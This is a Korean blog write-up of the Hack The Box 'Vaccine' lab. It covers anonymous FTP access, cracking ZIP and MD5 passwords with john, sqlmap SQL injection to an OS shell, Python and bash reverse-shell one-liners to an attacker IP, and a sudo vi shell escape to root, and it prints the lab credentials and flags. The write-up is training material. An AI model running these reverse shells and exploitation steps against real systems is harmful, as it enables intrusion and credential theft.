---
title: "Hack The Box - Vaccine Writeup"
date: 2026-04-06T20:33:00+09:00
categories:
  - Web Hacking
tags:
  - Hack The Box
  - Tier 2
  - Vaccine
  - FTP
  - SQL Injection
  - SQLMap
  - PostgreSQL
last_modified_at: 2026-04-06T20:33:00+09:00
published: true
---
## 개요

Vaccine은 공개 FTP에서 백업 파일을 회수하고, 압축 비밀번호와 웹 관리자 비밀번호를 차례대로 복구한 뒤, 로그인된 상태의 SQL injection을 `sqlmap`으로 악용해 OS 셸을 얻고, 마지막에 `sudo vi` 권한으로 root까지 올라가는 문제

흐름은 아래와 같다

- FTP 익명 로그인
- `backup.zip` 회수
- `zip2john`과 `john`으로 ZIP 비밀번호 복구
- 백업 소스에서 관리자 해시 확인
- MD5 해시 크래킹으로 관리자 로그인
- 검색 기능의 SQL injection 확인
- `sqlmap --os-shell`로 서버 명령 실행
- `dashboard.php`에서 PostgreSQL 계정 회수
- SSH 접속 후 `sudo vi` 셸 탈출

## 1. 정보 수집과 FTP 접근

공개 서비스 식별과 초기 자원 회수 단계

우선 확인: 전체 포트 스캔으로 첫 단서 확보

```bash
nmap -Pn -p- --min-rate 3000 --max-retries 2 -T4 10.129.76.213
```

- `-Pn`: ICMP 응답과 무관하게 스캔
- `-p-`: 전체 TCP 포트 스캔
- `--min-rate 3000`: 스캔 속도 유지
- `--max-retries 2`: 불필요한 재시도 축소
- `-T4`: 빠른 타이밍 템플릿

핵심 출력

```text
PORT   STATE SERVICE
21/tcp open  ftp
```

실질적 출발점: FTP

익명 로그인 시도

```bash
ftp 10.129.76.213
```

로그인 과정에서 확인할 줄

```text
220 (vsFTPd 3.0.3)
Name: anonymous
230 Login successful.
```

`230 Login successful`이 보이면 익명 접근이 허용된 상태다

디렉터리 목록을 보고 파일을 내려받는다

```text
ls
get backup.zip
```

핵심 출력

```text
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Transfer complete.
```

회수한 대상은 `backup.zip`임

## 2. 백업 파일 비밀번호 복구

자격 증명 복구 단계

압축 파일은 바로 열리지 않으므로 먼저 해시 형태로 변환

```bash
zip2john backup.zip > vaccine_hash.txt
```

- `backup.zip`: 대상 압축 파일
- `>`: 결과를 파일로 저장

`zip2john`은 압축을 푸는 도구가 아니라 크래킹용 입력값을 만드는 도구

다음 단계: `john`으로 비밀번호 확인

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt vaccine_hash.txt
```

- `--wordlist`: 사전 파일 지정
- `rockyou.txt`: 일반적으로 가장 먼저 시도하는 대표 사전

핵심 출력

```text
Loaded 1 password hash (PKZIP [32/64])
741852963        (backup.zip)
```

복구된 ZIP 비밀번호는 `741852963`임

필요하면 결과만 다시 볼 수 있다

```bash
john --show vaccine_hash.txt
```

```text
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
```

압축을 푼다

```bash
unzip backup.zip
```

비밀번호 입력 후 소스 확인

## 3. 웹 관리자 비밀번호 복구

소스 분석과 추가 자격 증명 확보 단계

압축 해제된 `index.php`에서 로그인 검증 코드를 본다

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
  $_SESSION['login'] = "true";
  header("Location: dashboard.php");
}
```

여기서 중요한 값은 관리자 평문 비밀번호가 아니라 MD5 해시다

해시만 별도 파일로 저장한 뒤 다시 `john`을 사용

```bash
john --format=raw-md5 vaccine_admin_pw.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- `--format=raw-md5`: 솔트 없는 MD5 해시 형식 명시
- `vaccine_admin_pw.txt`: 크래킹 대상 해시 파일

핵심 출력

```text
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
qwerty789
```

관리자 계정 정보

```text
admin
qwerty789
```

## 4. 웹 로그인과 SQL injection 확인

웹 기능 분석과 취약점 검증 단계

관리자 계정으로 로그인한 뒤 검색 기능에 작은따옴표 하나를 넣어본다

```text
'
```

핵심 에러 출력

```text
ERROR:  unterminated quoted string at or near "'"
LINE 1: Select * from cars where name ilike '%'%' 
```

이 응답만으로도 다음 사실을 확인 가능

- 서버가 입력값을 SQL 구문 안에 직접 넣고 있음
- DBMS가 PostgreSQL 계열임
- 검색 파라미터가 SQL injection 후보임

## 5. SQLMap으로 OS 셸 확보

취약점 자동화와 명령 실행 단계

로그인된 요청을 Burp에서 `burp_req.txt`로 저장한 뒤 `sqlmap`에 넘긴다

```bash
sqlmap -r burp_req.txt --os-shell --batch
```

- `-r burp_req.txt`: Burp에서 저장한 원시 HTTP 요청 사용
- `--os-shell`: DB 취약점을 이용해 OS 셸 시도
- `--batch`: 확인 질문에 자동 응답

이 문제에서 `-r`이 중요한 이유는 인증 쿠키와 검색 요청 형태를 그대로 재현하기 쉽기 때문임

`sqlmap`에서 자주 같이 쓰는 옵션은 아래 정도만 기억해도 충분하다

- `-u`: URL 직접 지정
- `-p`: 특정 파라미터만 테스트
- `--cookie`: 세션 쿠키 직접 전달
- `--dbms`: 추정 DBMS 지정
- `--dbs`: 데이터베이스 목록 확인
- `-D`, `-T`, `-C`: DB, 테이블, 컬럼 선택
- `--dump`: 데이터 추출
- `--file-read`, `--file-write`: 파일 읽기와 쓰기

OS 셸이 열리면 먼저 사용자 플래그 확인

```text
cat ../../user.txt
```

```text
ec9b13ca4d6229cd5cc1e09980965bf7
```

다음 단계: 웹 루트 파일 확인

```text
ls /var/www/html
```

핵심 출력

```text
dashboard.php
index.php
style.css
dashboard.css
```

노출된 셸은 기능상 제한이 있어 `dashboard.php`처럼 따옴표가 많은 파일은 출력이 깨질 수 있다

이럴 때는 더 안정적인 리버스 셸로 옮기는 편이 낫다

## 6. 리버스 셸과 PostgreSQL 계정 확보

셸 안정화와 로컬 계정 확보 단계

공격자 쪽 리스너 선실행

```bash
nc -lvnp 8888
```

대상 OS 셸에서 가능한 방법으로 리버스 셸을 보낸다

파이썬이 있으면 아래 한 줄이 편하다

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.118",8888));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

파이썬이 없으면 `bash`만으로도 가능

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.118/8888 0>&1'
```

리스너 프롬프트 확인 시 더 안정적인 셸 확보 상태

```text
postgres@vaccine:/var/lib/postgresql/11/main$
```

이제 파일을 직접 읽을 수 있다

```bash
cat /var/www/html/dashboard.php
```

핵심 내용

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

여기서 확보한 값

- 계정 `postgres`
- 비밀번호 `P@s5w0rd!`

## 7. SSH 재접속과 sudo 권한 상승

계정 재사용과 최종 권한 상승 단계

획득한 계정으로 SSH 접속

```bash
ssh postgres@10.129.89.65
```

로그인 후 `sudo` 허용 범위 확인

```bash
sudo -l
```

핵심 출력

```text
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

즉 `postgres` 사용자는 지정된 파일에 한해 `vi`를 root 권한으로 실행 가능

`vi`는 단순 편집기가 아니라 외부 명령 실행 기능이 있으므로 셸 탈출 지점

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

`vi` 내부에서 아래 명령으로 바로 root 명령 실행 가능

```vim
:!ls /root
:!cat /root/root.txt
```

- `:!명령`: `vi` 안에서 외부 셸 명령 실행

루트 플래그

```text
dd6e058e814260bc70e9bbdef2715849
```

사용자 플래그

```text
ec9b13ca4d6229cd5cc1e09980965bf7
```

## 정리

핵심: 자격 증명 복구와 SQL injection 연결

- FTP 공개 접근에서 백업 파일 회수
- ZIP 비밀번호 복구 후 소스 분석
- 관리자 MD5 해시 복구
- 로그인 후 검색 기능 SQL injection 확인
- `sqlmap --os-shell`로 OS 명령 실행
- `dashboard.php`에서 PostgreSQL 비밀번호 회수
- `sudo vi` 셸 탈출로 root 접근

초기 진입, 자격 증명 재사용, DB 기반 명령 실행, `sudo` 오용까지 한 문제 안에서 모두 연습할 수 있는 구조
